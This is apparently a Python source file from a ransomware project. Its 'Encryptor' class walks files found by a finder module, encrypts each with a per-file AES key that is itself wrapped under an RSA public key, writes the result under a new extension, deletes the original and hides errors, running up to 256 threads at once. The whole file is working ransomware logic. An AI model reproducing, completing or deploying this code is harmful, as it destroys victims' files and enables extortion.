# Date: 11/03/2019
# Author: Mohamed
# Description: Locate and encrypt files

import os
import time
import lib.const as const
from lib.file import File
from threading import Thread, RLock
from lib.file_finder import FileFinder
from lib.crypto import CryptoRSA, CryptoAES


class Encryptor:

    def __init__(self, RSA_public_key):
        self.active_threads = 0
        self.max_active_threads = 256
        self.file_finder = FileFinder()
        self.active_threads_lock = RLock()
        self.RSA_public_key = RSA_public_key

    def _encrypt_file(self, file, AES_key):

        wrote_key = False
        new_file_name = os.path.basename(file) + const.encrypted_extension
        new_file_path = os.path.join(os.path.dirname(file), new_file_name)

        try:
            with open(new_file_path, 'wb') as f:

                for data in File.read(file,):
                    if not wrote_key:
                        wrote_key = True
                        encrypted_AES_key = CryptoRSA.encrypt(
                            AES_key, self.RSA_public_key)

                        f.write(encrypted_AES_key)
                    f.write(CryptoAES.encrypt(data, AES_key))

            # delete original file
            os.remove(file)
        except:
            pass
        finally:
            with self.active_threads_lock:
                self.active_threads -= 1

    def _encrypt_files(self):
        while True:

            if not self.file_finder.is_active and not self.file_finder.targets.qsize():

                with self.active_threads_lock:
                    if self.active_threads <= 0:
                        break

            with self.active_threads_lock:
                if self.active_threads >= self.max_active_threads:
                    continue

            if self.file_finder.targets.qsize():
                file = self.file_finder.targets.get()
                AES_key = CryptoAES.generate_key()

                with self.active_threads_lock:
                    self.active_threads += 1

                Thread(target=self._encrypt_file, args=[
                       file, AES_key], daemon=True).start()

    def start(self):

        # start file search
        Thread(target=self.file_finder.start, daemon=True).start()
        time.sleep(1)

        # start encrypting
        self._encrypt_files()
